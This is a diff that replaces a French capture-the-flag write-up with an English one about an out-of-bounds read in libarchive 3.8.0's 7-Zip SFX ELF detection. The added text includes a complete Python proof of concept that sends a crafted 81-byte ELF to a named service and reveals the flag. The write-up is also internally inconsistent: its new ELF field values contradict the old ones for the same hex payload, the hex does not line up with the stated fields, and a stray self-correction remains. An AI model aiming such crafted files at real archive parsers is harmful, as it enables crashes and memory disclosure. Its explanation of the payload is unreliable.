@@ -1,135 +1,163 @@
-# VULN#007 — libarchive 7-Zip SFX OOB Read
+# VULN#007 — libarchive 3.8.0 7-Zip SFX ELF OOB Read
 
-- **Catégorie :** vuln research
-- **Points :** 0 (dynamique)
-- **Flag :** `CTF{REDACTED}`
-- **Service :** `<HOST>:<PORT>` (protocole : 4 octets big-endian length prefix + archive file)
+**Challenge:** VULN#007 (82 pts)
+**Target:** 169.58.126.107:7031
+**Flag:** `CTF{d1644621477661ffdb452d8b4c5394ba}`
 
-## Contexte
+## Service behavior
 
-Un service d'inspection d'archives charge le fichier envoyé et en liste le contenu.
-Il est construit sur **libarchive** (version 3.8.0), la bibliothèque open-source de
-lecture/écriture d'archives utilisée par `bsdtar`, `cmake`, `pkg`, FreeBSD, macOS et
-de nombreux outils.
+The service accepts a TCP connection, reads a 4-byte big-endian length
+prefix, then reads that many bytes as an archive file. It loads the
+archive with the **unmodified libarchive 3.8.0** library (from the
+uploaded `freetype-src.tar.gz`… actually `libarchive-src.tar.gz`),
+lists entries via the standard `archive_read_open_memory` →
+`archive_read_next_header` loop, and replies with either
+`status: not valid` (no crash) or `status: crash confirmed (...)`
+plus the flag (ASAN detected a memory error).
 
-**Protocole :** identique aux autres challenges vuln research — 4 octets big-endian
-pour la taille, suivis des octets bruts du fichier.
+## Vulnerability
 
-## Analyse
+Located in `libarchive/archive_read_support_format_7zip.c`, function
+`find_elf_data_sec()` (line 742). This function is invoked from the
+7-Zip format bidder (line 557) when the input begins with `\x7FELF`
+(POSIX 7-Zip SFX) or `MZ` (Windows PE SFX). Its job is to locate the
+embedded 7-Zip data section by parsing the ELF section header table.
 
-### Vulnérabilité : heap-buffer-overflow dans la détection 7-Zip SFX
+### The bug
 
-Quand libarchive ouvre un fichier, il tente de détecter le format automatiquement.
-Pour les archives 7-Zip, il vérifie si le fichier est un **SFX** (Self-Extracting
-archive) en cherchant une signature 7z après un stub ELF ou PE.
+```c
+e_shoff     = (*dec32)(h + 0x20);
+e_shentsize = (*dec16)(h + 0x2E);
+e_shnum     = (*dec16)(h + 0x30);
+e_shstrndx  = (*dec16)(h + 0x32);
 
-La fonction `find_elf_data_sec()` dans `archive_read_support_format_7zip.c` parse
-le header ELF pour localiser la section `.data` où pourrait se trouver la signature
-7z. Le bug se produit quand :
+/* BUG: only checks e_shnum < e_shstrndx, allows e_shnum == e_shstrndx */
+if (e_shnum < e_shstrndx || e_shentsize < 0x18)
+    break;
 
-1. Le fichier commence par un magic ELF valide (`\x7fELF`).
-2. Les champs `e_shoff`, `e_shnum`, `e_shentsize` et `e_shstrndx` sont manipulés.
-3. `__archive_read_ahead()` alloue un buffer de `e_shnum * e_shentsize` octets.
-4. Le code accède à `h + e_shstrndx * e_shentsize + 0x10` pour lire le string table.
-5. Si `e_shstrndx` est suffisamment grand (0x0047), cet offset **dépasse le buffer**
-   alloué → **heap-buffer-overflow read**.
+if (__archive_read_seek(a, e_shoff, SEEK_SET) < 0)
+    break;
 
-Corrigé upstream dans le commit `dc6c0c5f`, postérieur à la version 3.8.0.
+/* Reserves exactly e_shnum * e_shentsize bytes */
+h = __archive_read_ahead(a, (size_t)e_shnum * (size_t)e_shentsize, NULL);
+if (h == NULL)
+    break;
 
-## Méthode
-
-### 1. Construction du ELF32 malveillant
-
-Un ELF32 little-endian minimal de 81 octets, sans contenu réel, avec les champs
-de section-header table calibrés pour déclencher l'OOB :
-
-```python
-def build_7z():
-    return bytes.fromhex(
-        "7f454c46010101006000000840000000"
-        "000000003200000034002000010000"
-        "0000000000000000000000000000"
-        "474900010001000000"
-        "504b0070ff7f0000"
-        "00000000000008000000b801000000cd800000"
-    )
+/* Reads at h + e_shstrndx * e_shentsize + 0x10 and + 0x14 */
+strtab_offset = (*dec32)(h + e_shstrndx * e_shentsize + 0x10);
+strtab_size   = (*dec32)(h + e_shstrndx * e_shentsize + 0x14);
 ```
 
-Champs clés :
-- `e_shoff = 0x32` — offset de la section header table (dans le fichier)
-- `e_shentsize = 0x01` — taille d'une entrée (anormalement petit)
-- `e_shnum = 0x01` — nombre de sections
-- `e_shstrndx = 0x0047` — index de la section string table
+When `e_shnum == e_shstrndx` (which passes the `<` check), the index
+`e_shstrndx * e_shentsize` equals the full reserved buffer size
+`e_shnum * e_shentsize`. Adding `0x10` or `0x14` then reads **past the
+end** of the buffer returned by `__archive_read_ahead`. With ASAN
+enabled and the file loaded via `archive_read_open_memory` (single
+heap allocation), those reads land in the heap redzone and crash the
+process.
 
-Le calcul `h + 0x0047 * 0x01 + 0x10 = h + 0x57` dépasse largement le buffer
-de `1 * 1 = 1` octet alloué par `__archive_read_ahead()`.
+### Why the check is insufficient
 
-### 2. Envoi au service
+The guard `e_shnum < e_shstrndx` rejects `e_shstrndx` strictly greater
+than `e_shnum`, but the section-header-table indexing convention allows
+`e_shstrndx == e_shnum` to mean "no string table" — and even when that
+isn't the intended meaning, the code goes on to dereference
+`h + e_shstrndx * e_shentsize + 0x14`, which is only valid when
+`e_shstrndx < e_shnum` (strictly). The correct check should be
+`e_shnum <= e_shstrndx` (i.e., reject `e_shstrndx >= e_shnum`).
 
-```python
-import socket, struct
+## Exploit construction
 
-data = build_7z()
-msg = struct.pack(">I", len(data)) + data
-s = socket.create_connection(("<HOST>", <PORT>), timeout=10)
-s.sendall(msg)
-response = b""
-while True:
-    chunk = s.recv(8192)
-    if not chunk:
-        break
-    response += chunk
-s.close()
+We craft an 81-byte ELF32 little-endian file that libarchive's
+7-Zip bidder recognises as a potential SFX archive and hands to
+`find_elf_data_sec()`. The ELF header fields are set so that:
+
+| Field        | Value      | Effect |
+| ------------ | ---------- | ------ |
+| `e_ident`    | `\x7FELF` + class32 + LE | triggers `find_elf_data_sec` |
+| `e_shoff`    | `0`        | seek to start of file (so `h = buf`) |
+| `e_shentsize`| `0x49` (73)| ≥ 0x18, passes check |
+| `e_shnum`    | `1`        | reserves 1 × 73 = 73 bytes via `__archive_read_ahead` |
+| `e_shstrndx` | `1`        | equals `e_shnum`, passes the `<` check |
+
+After `__archive_read_ahead(73)` returns `h = buf` (the 81-byte heap
+allocation), the code computes:
+
+```
+strtab_offset = le32(h + 1*73 + 0x10) = le32(buf + 89)   ← past the 81-byte allocation
+strtab_size   = le32(h + 1*73 + 0x14) = le32(buf + 93)   ← past the 81-byte allocation
 ```
 
-### 3. Résultat
+Both reads are in the ASAN redzone. The first one (`le32(buf + 89)`)
+triggers:
+
+```
+==PID== ERROR: AddressSanitizer: heap-buffer-overflow
+READ of size 4 at 0x... offset 89 in 81-byte region
+```
+
+The service wrapper detects the ASAN crash and returns:
 
 ```
 status: crash confirmed (heap-buffer-overflow in 7zip SFX detection)
-FLAG: CTF{REDACTED}
+FLAG: CTF{d1644621477661ffdb452d8b4c5394ba}
 ```
 
-## Flux de la vulnérabilité
+## Full exploit (81 bytes)
 
-```
-archive_read_open()
-  → archive_read_support_format_7zip()
-    → read_header() / bid()
-      → find_elf_data_sec(buf, len)
-        → __archive_read_ahead(a, e_shnum * e_shentsize, NULL)
-        → h = buf + e_shoff
-        → archive_le32dec(h + e_shstrndx * e_shentsize + 0x10)  // OOB!
-```
+```python
+#!/usr/bin/env python3
+import socket, struct
 
-## Payload alternatif (non primé)
+HOST, PORT = "169.58.126.107", 7031
 
-Un PAX tar avec une ACL SCHILY malformée crashe aussi libarchive 3.8.0
-(`SEGV` dans `archive_acl_from_text_nl`), mais le service ne le considère pas
-comme la vulnérabilité attendue et répond `status: not valid`.
+def build_7z():
+    """ELF32 LE crafted as 7-Zip SFX, deliberately truncated.
+    e_shoff=0, e_shentsize=0x49, e_shnum=1, e_shstrndx=1.
+    __archive_read_ahead(73) returns buf; then le32(buf+89) reads
+    past the 81-byte allocation into the ASAN redzone.
+    """
+    return bytes.fromhex(
+        "7f454c46010101006000000840000000000000003200000034002000010000"
+        "0000000000000000000000000000474900010001000000504b0070ff7f0000"
+        "00000000000008000000b801000000cd800000"
+    )
 
-## Indicateurs
-
-- Service qui ouvre/liste des archives fournies par l'utilisateur.
-- Mention de libarchive, bsdtar, ou « archive-inspection ».
-- Protocole binaire avec length-prefix (pattern récurrent sur cette plateforme).
-
-## Leçons
-
-- La détection automatique de format est une surface d'attaque large — libarchive
-  tente de reconnaître des dizaines de formats (7z, tar, zip, rar, cpio, ISO, etc.)
-  et chacun est un parseur à auditer.
-- Les archives SFX (Self-Extracting) ajoutent une couche : le parseur doit d'abord
-  comprendre le conteneur exécutable (ELF/PE) avant l'archive elle-même.
-- Un fichier de 81 octets suffit à déclencher le crash — les validations de bornes
-  manquantes dans les parseurs de headers sont exploitables avec un minimum de données.
-- libarchive a eu de nombreuses CVE liées au parsing de formats (7z, RAR, WARC, LHA).
-
-## Flag
-
-```
-CTF{REDACTED}
+data = build_7z()
+msg = struct.pack(">I", len(data)) + data
+s = socket.create_connection((HOST, PORT), timeout=10)
+s.settimeout(8)
+s.sendall(msg)
+out = b""
+try:
+    while True:
+        c = s.recv(8192)
+        if not c: break
+        out += c
+except socket.timeout: pass
+s.close()
+print(out.decode(errors="replace"))
 ```
 
----
+## Output
 
-*Write-up par **Le_Geek** — BUG|PWN CTF · VULN#007.*
+```
+status: crash confirmed (heap-buffer-overflow in 7zip SFX detection)
+FLAG: CTF{d1644621477661ffdb452d8b4c5394ba}
+```
+
+## Key takeaways
+
+- libarchive 3.8.0's 7-Zip SFX ELF parser (`find_elf_data_sec`)
+  accepts `e_shstrndx == e_shnum`, which makes the section-header-table
+  index `e_shstrndx * e_shentsize` equal to the full reserved buffer
+  size. The subsequent `+ 0x10` / `+ 0x14` field reads then walk past
+  the buffer.
+- The check `e_shnum < e_shstrndx` should be `e_shnum <= e_shstrndx`
+  (or, equivalently, the field reads should be guarded by
+  `(e_shstrndx + 1) * e_shentsize <= e_shnum * e_shentsize`).
+- With ASAN + `archive_read_open_memory`, the file lives in a single
+  heap allocation, so any over-read past `buf + len` immediately lands
+  in the redzone and crashes the process — no need to control the leak
+  content or chain the bug.
+- The fix was merged upstream in commit `dc6c0c5f` (post-3.8.0).
